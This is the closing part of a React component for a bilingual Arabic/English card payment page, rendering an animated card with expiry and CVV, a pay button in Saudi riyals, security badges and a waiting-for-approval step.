                            <AnimatePresence mode="wait">
                              <motion.p
                                key={expiry || "placeholder"}
                                initial={{ y: -10, opacity: 0, scale: 0.9 }}
                                animate={{ y: 0, opacity: 1, scale: 1 }}
                                exit={{ y: 10, opacity: 0, scale: 0.9 }}
                                transition={{ duration: 0.3, ease: "easeOut" }}
                                className={`text-sm font-medium font-mono ${expiry && expiry !== "/" ? "text-white drop-shadow-[0_0_8px_rgba(212,175,55,0.6)]" : "text-white"}`}
                              >
                                {expiry && expiry !== "/" ? expiry : "MM/YY"}
                              </motion.p>
                            </AnimatePresence>
                          </div>
                        </div>

                        {/* نص "اضغط للقلب" */}
                        <div className="absolute bottom-1.5 left-1/2 -translate-x-1/2">
                          <p className="text-white/30 text-[9px]">{isAr ? "انقر لقلب البطاقة" : "Tap to flip"}</p>
                        </div>
                      </div>

                      {/* الوجه الخلفي */}
                      <div
                        className="absolute inset-0 rounded-2xl overflow-hidden shadow-lg flex flex-col"
                        style={{
                          backfaceVisibility: "hidden",
                          transform: "rotateY(180deg)",
                          background: "linear-gradient(135deg, hsl(220 12% 10%) 0%, hsl(220 15% 6%) 40%, hsl(43 40% 15%) 100%)",
                        }}
                      >
                        {/* الشريط المغناطيسي */}
                        <div className="w-full h-10 bg-black/80 mt-6" />

                        {/* شريط التوقيع + CVV */}
                        <div className="px-5 mt-5 flex items-center gap-3">
                          <div className="flex-1 h-9 bg-white/90 rounded-md flex items-center px-3">
                            <div className="flex-1">
                              <div className="h-1 bg-muted rounded mb-1 w-3/4" />
                              <div className="h-1 bg-muted rounded w-1/2" />
                            </div>
                          </div>
                          <div className="bg-white rounded-md px-3 py-1.5 min-w-[56px] text-center">
                            <p className="text-[10px] text-muted-foreground mb-0.5">CVV</p>
                            <p className="font-mono font-bold text-foreground text-lg tracking-widest">
                              {cvv || (brand === "amex" ? "••••" : "•••")}
                            </p>
                          </div>
                        </div>

                        {/* معلومات إضافية */}
                        <div className="px-5 mt-auto mb-4 flex items-end justify-between">
                          <div>
                            <p className="text-white/40 text-[9px]">{isAr ? "بطاقة ائتمان / خصم" : "Credit / Debit Card"}</p>
                            <p className="text-white/60 text-[10px] font-medium mt-0.5">
                              {bank ? (isAr ? bank.bankAr : bank.bank) : ""}
                            </p>
                          </div>
                          <div className="bg-white/15 rounded-lg px-2 py-1">
                            <BrandLogo brand={brand} />
                          </div>
                        </div>

                        {/* نص "اضغط للقلب" */}
                        <div className="absolute bottom-1.5 left-1/2 -translate-x-1/2">
                          <p className="text-white/30 text-[9px]">{isAr ? "انقر لقلب البطاقة" : "Tap to flip"}</p>
                        </div>
                      </div>
                    </motion.div>
                  </div>

                  <button
                    onClick={handlePay}
                    disabled={loading}
                    className="w-full h-13 py-3.5 rounded-xl font-bold text-primary-foreground text-base
                      bg-primary hover:bg-primary/90
                      disabled:opacity-60 disabled:cursor-not-allowed
                      transition-all flex items-center justify-center gap-2 shadow-md"
                  >
                    {loading ? (
                      <><Loader2 className="w-5 h-5 animate-spin" /> {isAr ? "جاري المعالجة..." : "Processing..."}</>
                    ) : (
                      <><Lock className="w-4 h-4" />
                        {isAr
                          ? `ادفع ${state?.total?.toLocaleString() || ""} ر.س`
                          : `Pay ${state?.total?.toLocaleString() || ""} SAR`}
                      </>
                    )}
                  </button>

                  <div className="flex items-center justify-center gap-4">
                    {["🔒 SSL", "🛡️ 3D Secure", "✓ PCI DSS"].map(b => (
                      <span key={b} className="text-xs text-muted-foreground">{b}</span>
                    ))}
                  </div>
                </motion.div>
              )}

              {step === "waiting" && (
                <motion.div
                  key="waiting"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  className="p-6"
                >
                  <WaitingApproval
                    orderId={orderId}
                    onApproved={handleApproved}
                    onRejected={handleRejected}
                    isAr={isAr}
                  />
                </motion.div>
              )}
            </AnimatePresence>
          </div>

          <div className="flex items-center justify-center gap-2 mt-4 text-xs text-muted-foreground">
            <ShieldCheck className="w-4 h-4" />
            <span>{isAr ? "بياناتك محمية بتشفير SSL 256-bit" : "Your data is protected by 256-bit SSL encryption"}</span>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default CardPayment;
